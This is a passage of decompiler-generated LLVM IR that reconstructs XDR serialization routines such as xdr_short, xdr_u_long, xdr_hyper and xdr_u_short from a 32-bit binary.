entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_8056e2e = inttoptr i32 %tmp2 to i32*
  %v2_8056e2e = load i32, i32* %v1_8056e2e, align 4
  store i32 %v2_8056e2e, i32* %eax.global-to-local, align 4
  %v1_8056e30 = icmp eq i32 %v2_8056e2e, 0
  %v1_8056e32 = icmp eq i1 %v1_8056e30, false
  br i1 %v1_8056e32, label %dec_label_pc_8056e3c, label %dec_label_pc_8056e34

dec_label_pc_8056e34:                             ; preds = %entry
  %v1_8056e34 = add i32 %tmp2, 4
  %v2_8056e34 = inttoptr i32 %v1_8056e34 to i32*
  %v3_8056e34 = load i32, i32* %v2_8056e34, align 4
  store i32 %v3_8056e34, i32* %eax.global-to-local, align 4
  %v1_8056e37 = add i32 %v3_8056e34, 4
  br label %dec_label_pc_8056e4e

dec_label_pc_8056e3c:                             ; preds = %entry
  %v9_8056e3c = icmp eq i32 %v2_8056e2e, 1
  %v1_8056e3f = icmp eq i1 %v9_8056e3c, false
  br i1 %v1_8056e3f, label %dec_label_pc_8056e50, label %dec_label_pc_8056e41

dec_label_pc_8056e41:                             ; preds = %dec_label_pc_8056e3c
  %v1_8056e41 = add i32 %tmp2, 4
  %v2_8056e41 = inttoptr i32 %v1_8056e41 to i32*
  %v3_8056e41 = load i32, i32* %v2_8056e41, align 4
  store i32 %v3_8056e41, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056e4e

dec_label_pc_8056e4e:                             ; preds = %dec_label_pc_8056e34, %dec_label_pc_8056e41
  %storemerge.in.in = phi i32 [ %v1_8056e37, %dec_label_pc_8056e34 ], [ %v3_8056e41, %dec_label_pc_8056e41 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %storemerge)
  %v0_8056e50.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056e50

dec_label_pc_8056e50:                             ; preds = %dec_label_pc_8056e3c, %dec_label_pc_8056e4e
  %v0_8056e50 = phi i32 [ %v2_8056e2e, %dec_label_pc_8056e3c ], [ %v0_8056e50.pre, %dec_label_pc_8056e4e ]
  %v9_8056e50 = icmp eq i32 %v0_8056e50, 2
  %v1_8056e53 = zext i1 %v9_8056e50 to i32
  store i32 %v1_8056e53, i32* %eax.global-to-local, align 4
  ret i32 %v1_8056e53

; uselistorder directives
  uselistorder i32 %v2_8056e2e, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8056e50, { 1, 0 }
  uselistorder label %dec_label_pc_8056e4e, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8056e66 = load i32, i32* %arg1, align 4
  %v9_8056e68 = icmp eq i32 %v2_8056e66, 1
  br i1 %v9_8056e68, label %dec_label_pc_8056e95, label %dec_label_pc_8056e6d

dec_label_pc_8056e6d:                             ; preds = %entry
  %v5_8056e68 = icmp eq i32 %v2_8056e66, 0
  br i1 %v5_8056e68, label %dec_label_pc_8056e7b, label %dec_label_pc_8056e6f

dec_label_pc_8056e6f:                             ; preds = %dec_label_pc_8056e6d
  %v9_8056e6f = icmp eq i32 %v2_8056e66, 2
  br i1 %v9_8056e6f, label %dec_label_pc_8056eb9, label %dec_label_pc_8056eb7

dec_label_pc_8056e7b:                             ; preds = %dec_label_pc_8056e6d
  %v1_8056e7b = inttoptr i32 %arg2 to i16*
  %v2_8056e7b = load i16, i16* %v1_8056e7b, align 2
  %v3_8056e7b = sext i16 %v2_8056e7b to i32
  store i32 %v3_8056e7b, i32* %stack_var_-8, align 4
  %v1_8056e84 = add i32 %tmp8, 4
  %v2_8056e84 = inttoptr i32 %v1_8056e84 to i32*
  %v3_8056e84 = load i32, i32* %v2_8056e84, align 4
  %v2_8056e87 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8056e8d = add i32 %v3_8056e84, 4
  %v6_8056e8d = inttoptr i32 %v5_8056e8d to i32*
  %v7_8056e8d = load i32, i32* %v6_8056e8d, align 4
  call void @__pseudo_call(i32 %v7_8056e8d)
  br label %dec_label_pc_8056eb9

dec_label_pc_8056e95:                             ; preds = %entry
  %v1_8056e97 = add i32 %tmp8, 4
  %v2_8056e97 = inttoptr i32 %v1_8056e97 to i32*
  %v3_8056e97 = load i32, i32* %v2_8056e97, align 4
  %v5_8056ea0 = inttoptr i32 %v3_8056e97 to i32*
  %v6_8056ea0 = load i32, i32* %v5_8056ea0, align 4
  call void @__pseudo_call(i32 %v6_8056ea0)
  %v1_8056ea5 = icmp eq i32 %v3_8056e97, 0
  br i1 %v1_8056ea5, label %dec_label_pc_8056eb7, label %dec_label_pc_8056ea9

dec_label_pc_8056ea9:                             ; preds = %dec_label_pc_8056e95
  %v2_8056ead = load i32, i32* %ebx.global-to-local, align 4
  %v3_8056ead = inttoptr i32 %v2_8056ead to i16*
  br label %dec_label_pc_8056eb9

dec_label_pc_8056eb7:                             ; preds = %dec_label_pc_8056e6f, %dec_label_pc_8056e95
  br label %dec_label_pc_8056eb9

dec_label_pc_8056eb9:                             ; preds = %dec_label_pc_8056e6f, %dec_label_pc_8056ea9, %dec_label_pc_8056e7b, %dec_label_pc_8056eb7
  %v0_8056ebd = phi i32 [ 1, %dec_label_pc_8056e6f ], [ 1, %dec_label_pc_8056ea9 ], [ %v2_8056e87, %dec_label_pc_8056e7b ], [ 0, %dec_label_pc_8056eb7 ]
  %v2_8056ebc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056ebc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056ebd

; uselistorder directives
  uselistorder i32 %v2_8056e66, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056eb9, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056eb7, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8056ebe = call i32 @__GI_xdr_long()
  ret i32 %v0_8056ebe
}

define i32 @xdr_u_long(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %tmp6, i32* @ecx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8056ecf = load i32, i32* %arg1, align 4
  %v9_8056ed1 = icmp eq i32 %v2_8056ecf, 1
  br i1 %v9_8056ed1, label %dec_label_pc_8056ee4, label %dec_label_pc_8056ed6

dec_label_pc_8056ed6:                             ; preds = %entry
  %v5_8056ed1 = icmp eq i32 %v2_8056ecf, 0
  br i1 %v5_8056ed1, label %dec_label_pc_8056f05, label %dec_label_pc_8056ed8

dec_label_pc_8056ed8:                             ; preds = %dec_label_pc_8056ed6
  %v9_8056ed8 = icmp eq i32 %v2_8056ecf, 2
  br i1 %v9_8056ed8, label %dec_label_pc_8056f16, label %dec_label_pc_8056f14

dec_label_pc_8056ee4:                             ; preds = %entry
  %v1_8056ee6 = add i32 %tmp6, 4
  %v2_8056ee6 = inttoptr i32 %v1_8056ee6 to i32*
  %v3_8056ee6 = load i32, i32* %v2_8056ee6, align 4
  %v5_8056eef = inttoptr i32 %v3_8056ee6 to i32*
  %v6_8056eef = load i32, i32* %v5_8056eef, align 4
  call void @__pseudo_call(i32 %v6_8056eef)
  %v1_8056ef4 = icmp eq i32 %v3_8056ee6, 0
  br i1 %v1_8056ef4, label %dec_label_pc_8056f14, label %dec_label_pc_8056ef8

dec_label_pc_8056ef8:                             ; preds = %dec_label_pc_8056ee4
  %v1_8056efc = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056efc = inttoptr i32 %v1_8056efc to i32*
  br label %dec_label_pc_8056f16

dec_label_pc_8056f05:                             ; preds = %dec_label_pc_8056ed6
  %v1_8056f07 = add i32 %tmp6, 4
  %v2_8056f07 = inttoptr i32 %v1_8056f07 to i32*
  %v3_8056f07 = load i32, i32* %v2_8056f07, align 4
  %v5_8056f0c = add i32 %v3_8056f07, 4
  %v6_8056f0c = inttoptr i32 %v5_8056f0c to i32*
  %v7_8056f0c = load i32, i32* %v6_8056f0c, align 4
  call void @__pseudo_call(i32 %v7_8056f0c)
  br label %dec_label_pc_8056f16

dec_label_pc_8056f14:                             ; preds = %dec_label_pc_8056ed8, %dec_label_pc_8056ee4
  br label %dec_label_pc_8056f16

dec_label_pc_8056f16:                             ; preds = %dec_label_pc_8056ed8, %dec_label_pc_8056f05, %dec_label_pc_8056ef8, %dec_label_pc_8056f14
  %v0_8056f1a = phi i32 [ 1, %dec_label_pc_8056ed8 ], [ %v3_8056f07, %dec_label_pc_8056f05 ], [ 1, %dec_label_pc_8056ef8 ], [ 0, %dec_label_pc_8056f14 ]
  %v2_8056f19 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056f19, i32* @ebx, align 4
  ret i32 %v0_8056f1a

; uselistorder directives
  uselistorder i32 %v2_8056ecf, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056f16, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056f14, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v3_8056f1b = ptrtoint i32* %ulp to i32
  %v5_8056f1b = call i32 @xdr_u_long(i32* %xdrs, i32 %v3_8056f1b)
  ret i32 %v5_8056f1b
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8056f2d = inttoptr i32 %tmp7 to i32*
  %v2_8056f2d = load i32, i32* %v1_8056f2d, align 4
  store i32 %v2_8056f2d, i32* %eax.global-to-local, align 4
  %v1_8056f2f = icmp eq i32 %v2_8056f2d, 0
  %v1_8056f31 = icmp eq i1 %v1_8056f2f, false
  br i1 %v1_8056f31, label %dec_label_pc_8056f71, label %dec_label_pc_8056f59

dec_label_pc_8056f59:                             ; preds = %entry
  %v1_8056f33 = add i32 %tmp6, 4
  %v2_8056f33 = inttoptr i32 %v1_8056f33 to i32*
  %v3_8056f33 = load i32, i32* %v2_8056f33, align 4
  store i32 %v3_8056f33, i32* %edx.global-to-local, align 4
  store i32 %v3_8056f33, i32* %eax.global-to-local, align 4
  store i32 %v3_8056f33, i32* %stack_var_-12, align 4
  %v1_8056f3c = inttoptr i32 %tmp6 to i32*
  %v2_8056f3c = load i32, i32* %v1_8056f3c, align 4
  store i32 %v2_8056f3c, i32* %eax.global-to-local, align 4
  %v1_8056f44 = add i32 %tmp7, 4
  %v2_8056f44 = inttoptr i32 %v1_8056f44 to i32*
  %v3_8056f44 = load i32, i32* %v2_8056f44, align 4
  store i32 %v3_8056f44, i32* %edx.global-to-local, align 4
  %v2_8056f47 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8056f47, i32* %eax.global-to-local, align 4
  %v5_8056f4d = add i32 %v3_8056f44, 4
  %v6_8056f4d = inttoptr i32 %v5_8056f4d to i32*
  %v7_8056f4d = load i32, i32* %v6_8056f4d, align 4
  call void @__pseudo_call(i32 %v7_8056f4d)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8056f59 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056f59, i32* %eax.global-to-local, align 4
  %v0_8056f5f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f5f = add i32 %v0_8056f5f, 4
  %v2_8056f5f = inttoptr i32 %v1_8056f5f to i32*
  %v3_8056f5f = load i32, i32* %v2_8056f5f, align 4
  store i32 %v3_8056f5f, i32* %edx.global-to-local, align 4
  %v5_8056f64 = add i32 %v3_8056f5f, 4
  %v6_8056f64 = inttoptr i32 %v5_8056f64 to i32*
  %v7_8056f64 = load i32, i32* %v6_8056f64, align 4
  call void @__pseudo_call(i32 %v7_8056f64)
  %v4_8056f6c = and i32 %v2_8056f59, -256
  %v5_8056f6c = or i32 %v4_8056f6c, 1
  br label %dec_label_pc_8056fc5

dec_label_pc_8056f71:                             ; preds = %entry
  %v9_8056f71 = icmp eq i32 %v2_8056f2d, 1
  %v1_8056f74 = icmp eq i1 %v9_8056f71, false
  br i1 %v1_8056f74, label %dec_label_pc_8056fbf, label %dec_label_pc_8056f76

dec_label_pc_8056f76:                             ; preds = %dec_label_pc_8056f71
  %v1_8056f78 = add i32 %tmp7, 4
  %v2_8056f78 = inttoptr i32 %v1_8056f78 to i32*
  %v3_8056f78 = load i32, i32* %v2_8056f78, align 4
  store i32 %v3_8056f78, i32* %eax.global-to-local, align 4
  %v2_8056f7b = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8056f7b, i32* %edx.global-to-local, align 4
  %v5_8056f81 = inttoptr i32 %v3_8056f78 to i32*
  %v6_8056f81 = load i32, i32* %v5_8056f81, align 4
  call void @__pseudo_call(i32 %v6_8056f81)
  %v1_8056f86 = icmp eq i32 %v3_8056f78, 0
  br i1 %v1_8056f86, label %dec_label_pc_8056fca, label %dec_label_pc_8056f9e

dec_label_pc_8056f9e:                             ; preds = %dec_label_pc_8056f76
  %v2_8056f8a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056f8a, i32* %eax.global-to-local, align 4
  %v0_8056f90 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f90 = add i32 %v0_8056f90, 4
  %v2_8056f90 = inttoptr i32 %v1_8056f90 to i32*
  %v3_8056f90 = load i32, i32* %v2_8056f90, align 4
  store i32 %v3_8056f90, i32* %edx.global-to-local, align 4
  %v5_8056f95 = inttoptr i32 %v3_8056f90 to i32*
  %v6_8056f95 = load i32, i32* %v5_8056f95, align 4
  call void @__pseudo_call(i32 %v6_8056f95)
  %v3_8056f9e = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8056fa9 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056fa9 = add i32 %v1_8056fa9, 4
  %v3_8056fa9 = inttoptr i32 %v2_8056fa9 to i32*
  store i32 %v3_8056f9e, i32* %v3_8056fa9, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8056fb1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056fb1 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056fb1 = inttoptr i32 %v1_8056fb1 to i32*
  store i32 %v0_8056fb1, i32* %v2_8056fb1, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v0_8056fb7 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056fb7 = inttoptr i32 %v0_8056fb7 to i32*
  %v2_8056fb7 = load i32, i32* %v1_8056fb7, align 4
  %v4_8056fb7 = or i32 %v2_8056fb7, %tmp
  store i32 %v4_8056fb7, i32* %v1_8056fb7, align 4
  %v0_8056fcf.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056fcc

dec_label_pc_8056fbf:                             ; preds = %dec_label_pc_8056f71
  %v9_8056fbf = icmp eq i32 %v2_8056f2d, 2
  %v1_8056fc2 = zext i1 %v9_8056fbf to i32
  %v3_8056fc2 = and i32 %v2_8056f2d, -256
  %v4_8056fc2 = or i32 %v1_8056fc2, %v3_8056fc2
  br label %dec_label_pc_8056fc5

dec_label_pc_8056fc5:                             ; preds = %dec_label_pc_8056f59, %dec_label_pc_8056fbf
  %stack_var_-16.0 = phi i32 [ %tmp8, %dec_label_pc_8056fbf ], [ %v2_8056f3c, %dec_label_pc_8056f59 ]
  %storemerge = phi i32 [ %v4_8056fc2, %dec_label_pc_8056fbf ], [ %v5_8056f6c, %dec_label_pc_8056f59 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8056fc5 = urem i32 %storemerge, 256
  store i32 %v1_8056fc5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056fcc

dec_label_pc_8056fca:                             ; preds = %dec_label_pc_8056f76
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056fcc

dec_label_pc_8056fcc:                             ; preds = %dec_label_pc_8056fc5, %dec_label_pc_8056f9e, %dec_label_pc_8056fca
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8056fc5 ], [ %tmp8, %dec_label_pc_8056fca ], [ %tmp8, %dec_label_pc_8056f9e ]
  %v0_8056fcf = phi i32 [ %v1_8056fc5, %dec_label_pc_8056fc5 ], [ 0, %dec_label_pc_8056fca ], [ %v0_8056fcf.pre, %dec_label_pc_8056f9e ]
  store i32 %v0_8056fcf, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-16.1, i32* %ebx.global-to-local, align 4
  %v2_8056fd2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056fd2, i32* %esi.global-to-local, align 4
  ret i32 %v0_8056fcf

; uselistorder directives
  uselistorder i32 %v0_8056fcf, { 1, 0 }
  uselistorder i32 %v1_8056fc5, { 1, 0 }
  uselistorder i32 %v2_8056f2d, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 0, 2, 3, 1 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_8056fcc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056fc5, { 1, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8056fe1 = inttoptr i32 %tmp7 to i32*
  %v2_8056fe1 = load i32, i32* %v1_8056fe1, align 4
  store i32 %v2_8056fe1, i32* %eax.global-to-local, align 4
  %v1_8056fe3 = icmp eq i32 %v2_8056fe1, 0
  %v1_8056fe5 = icmp eq i1 %v1_8056fe3, false
  br i1 %v1_8056fe5, label %dec_label_pc_8057023, label %dec_label_pc_805700b

dec_label_pc_805700b:                             ; preds = %entry
  %v1_8056fe7 = add i32 %tmp6, 4
  %v2_8056fe7 = inttoptr i32 %v1_8056fe7 to i32*
  %v3_8056fe7 = load i32, i32* %v2_8056fe7, align 4
  store i32 %v3_8056fe7, i32* %stack_var_-12, align 4
  %v2_8056ff4 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8056ff4, i32* %eax.global-to-local, align 4
  %v1_8056ffa = add i32 %tmp7, 4
  %v2_8056ffa = inttoptr i32 %v1_8056ffa to i32*
  %v3_8056ffa = load i32, i32* %v2_8056ffa, align 4
  store i32 %v3_8056ffa, i32* %edx.global-to-local, align 4
  %v5_8056fff = add i32 %v3_8056ffa, 4
  %v6_8056fff = inttoptr i32 %v5_8056fff to i32*
  %v7_8056fff = load i32, i32* %v6_8056fff, align 4
  call void @__pseudo_call(i32 %v7_8056fff)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_805700b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805700b, i32* %eax.global-to-local, align 4
  %v0_8057011 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057011 = add i32 %v0_8057011, 4
  %v2_8057011 = inttoptr i32 %v1_8057011 to i32*
  %v3_8057011 = load i32, i32* %v2_8057011, align 4
  store i32 %v3_8057011, i32* %edx.global-to-local, align 4
  %v5_8057016 = add i32 %v3_8057011, 4
  %v6_8057016 = inttoptr i32 %v5_8057016 to i32*
  %v7_8057016 = load i32, i32* %v6_8057016, align 4
  call void @__pseudo_call(i32 %v7_8057016)
  %v4_805701e = and i32 %v2_805700b, -256
  %v5_805701e = or i32 %v4_805701e, 1
  br label %dec_label_pc_8057079

dec_label_pc_8057023:                             ; preds = %entry
  %v9_8057023 = icmp eq i32 %v2_8056fe1, 1
  %v1_8057026 = icmp eq i1 %v9_8057023, false
  br i1 %v1_8057026, label %dec_label_pc_8057073, label %dec_label_pc_8057050

dec_label_pc_8057050:                             ; preds = %dec_label_pc_8057023
  %v2_8057028 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8057028, i32* %eax.global-to-local, align 4
  %v1_805702e = add i32 %tmp7, 4
  %v2_805702e = inttoptr i32 %v1_805702e to i32*
  %v3_805702e = load i32, i32* %v2_805702e, align 4
  store i32 %v3_805702e, i32* %edx.global-to-local, align 4
  %v5_8057033 = inttoptr i32 %v3_805702e to i32*
  %v6_8057033 = load i32, i32* %v5_8057033, align 4
  call void @__pseudo_call(i32 %v6_8057033)
  %v2_805703c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805703c, i32* %eax.global-to-local, align 4
  %v0_8057042 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057042 = add i32 %v0_8057042, 4
  %v2_8057042 = inttoptr i32 %v1_8057042 to i32*
  %v3_8057042 = load i32, i32* %v2_8057042, align 4
  store i32 %v3_8057042, i32* %edx.global-to-local, align 4
  %v5_8057047 = inttoptr i32 %v3_8057042 to i32*
  %v6_8057047 = load i32, i32* %v5_8057047, align 4
  call void @__pseudo_call(i32 %v6_8057047)
  %v3_8057050 = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805705d = load i32, i32* %esi.global-to-local, align 4
  %v2_805705d = add i32 %v1_805705d, 4
  %v3_805705d = inttoptr i32 %v2_805705d to i32*
  store i32 %v3_8057050, i32* %v3_805705d, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8057065 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057065 = load i32, i32* %esi.global-to-local, align 4
  %v2_8057065 = inttoptr i32 %v1_8057065 to i32*
  store i32 %v0_8057065, i32* %v2_8057065, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v0_805706b = load i32, i32* %esi.global-to-local, align 4
  %v1_805706b = inttoptr i32 %v0_805706b to i32*
  %v2_805706b = load i32, i32* %v1_805706b, align 4
  %v4_805706b = or i32 %v2_805706b, %tmp
  store i32 %v4_805706b, i32* %v1_805706b, align 4
  %v0_8057083.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057080

dec_label_pc_8057073:                             ; preds = %dec_label_pc_8057023
  %v9_8057073 = icmp eq i32 %v2_8056fe1, 2
  %v1_8057076 = zext i1 %v9_8057073 to i32
  %v3_8057076 = and i32 %v2_8056fe1, -256
  %v4_8057076 = or i32 %v1_8057076, %v3_8057076
  br label %dec_label_pc_8057079

dec_label_pc_8057079:                             ; preds = %dec_label_pc_805700b, %dec_label_pc_8057073
  %storemerge = phi i32 [ %v5_805701e, %dec_label_pc_805700b ], [ %v4_8057076, %dec_label_pc_8057073 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8057079 = urem i32 %storemerge, 256
  store i32 %v1_8057079, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057080

dec_label_pc_8057080:                             ; preds = %dec_label_pc_8057079, %dec_label_pc_8057050
  %v0_8057083 = phi i32 [ %v1_8057079, %dec_label_pc_8057079 ], [ %v0_8057083.pre, %dec_label_pc_8057050 ]
  store i32 %v0_8057083, i32* %eax.global-to-local, align 4
  ret i32 %v0_8057083

; uselistorder directives
  uselistorder i32 %v0_8057083, { 1, 0 }
  uselistorder i32 %v1_8057079, { 1, 0 }
  uselistorder i32 %v2_8056fe1, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_8057079, { 1, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_8057088 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_8057088
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_805708d = call i32 @xdr_u_hyper()
  ret i32 %v0_805708d
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_805709e = load i32, i32* %arg1, align 4
  %v9_80570a0 = icmp eq i32 %v2_805709e, 1
  br i1 %v9_80570a0, label %dec_label_pc_80570cd, label %dec_label_pc_80570a5

dec_label_pc_80570a5:                             ; preds = %entry
  %v5_80570a0 = icmp eq i32 %v2_805709e, 0
  br i1 %v5_80570a0, label %dec_label_pc_80570b3, label %dec_label_pc_80570a7

dec_label_pc_80570a7:                             ; preds = %dec_label_pc_80570a5
  %v9_80570a7 = icmp eq i32 %v2_805709e, 2
  store i32 1, i32* %eax.global-to-local, align 4
  br i1 %v9_80570a7, label %dec_label_pc_80570f1, label %dec_label_pc_80570ef

dec_label_pc_80570b3:                             ; preds = %dec_label_pc_80570a5
  %v1_80570b3 = inttoptr i32 %arg2 to i16*
  %v2_80570b3 = load i16, i16* %v1_80570b3, align 2
  %v3_80570b3 = zext i16 %v2_80570b3 to i32
  store i32 %v3_80570b3, i32* %stack_var_-8, align 4
  %v2_80570ba = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_80570ba, i32* %eax.global-to-local, align 4
  %v1_80570c0 = add i32 %tmp10, 4
  %v2_80570c0 = inttoptr i32 %v1_80570c0 to i32*
  %v3_80570c0 = load i32, i32* %v2_80570c0, align 4
  %v5_80570c5 = add i32 %v3_80570c0, 4
  %v6_80570c5 = inttoptr i32 %v5_80570c5 to i32*
  %v7_80570c5 = load i32, i32* %v6_80570c5, align 4
  call void @__pseudo_call(i32 %v7_80570c5)
  %v0_80570f5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570f1

dec_label_pc_80570cd:                             ; preds = %entry
  %v2_80570cd = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_80570cd, i32* %eax.global-to-local, align 4
  %v1_80570d3 = add i32 %tmp10, 4
  %v2_80570d3 = inttoptr i32 %v1_80570d3 to i32*
  %v3_80570d3 = load i32, i32* %v2_80570d3, align 4
  %v5_80570d8 = inttoptr i32 %v3_80570d3 to i32*
  %v6_80570d8 = load i32, i32* %v5_80570d8, align 4
  call void @__pseudo_call(i32 %v6_80570d8)
  %v0_80570dd = load i32, i32* %eax.global-to-local, align 4
  %v1_80570dd = icmp eq i32 %v0_80570dd, 0
  br i1 %v1_80570dd, label %dec_label_pc_80570ef, label %dec_label_pc_80570e1

dec_label_pc_80570e1:                             ; preds = %dec_label_pc_80570cd
  %v2_80570e5 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80570e5 = inttoptr i32 %v2_80570e5 to i16*
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570f1

dec_label_pc_80570ef:                             ; preds = %dec_label_pc_80570a7, %dec_label_pc_80570cd
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80570f1

dec_label_pc_80570f1:                             ; preds = %dec_label_pc_80570a7, %dec_label_pc_80570e1, %dec_label_pc_80570b3, %dec_label_pc_80570ef
  %v0_80570f5 = phi i32 [ 1, %dec_label_pc_80570a7 ], [ 1, %dec_label_pc_80570e1 ], [ %v0_80570f5.pre, %dec_label_pc_80570b3 ], [ 0, %dec_label_pc_80570ef ]
  %v2_80570f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80570f4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80570f5

; uselistorder directives
  uselistorder i32 %v2_805709e, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80570f1, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80570ef, { 1, 0 }
}

define i32 @xdr_char(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80570f6 = load i32, i32* @ebx, align 4
  store i32 %v0_80570f6, i32* %stack_var_-4, align 4
  %v4_80570fa = ptrtoint i8* %arg2 to i32
  store i32 %v4_80570fa, i32* %ebx.global-to-local, align 4
  %v2_80570fe = load i8, i8* %arg2, align 1
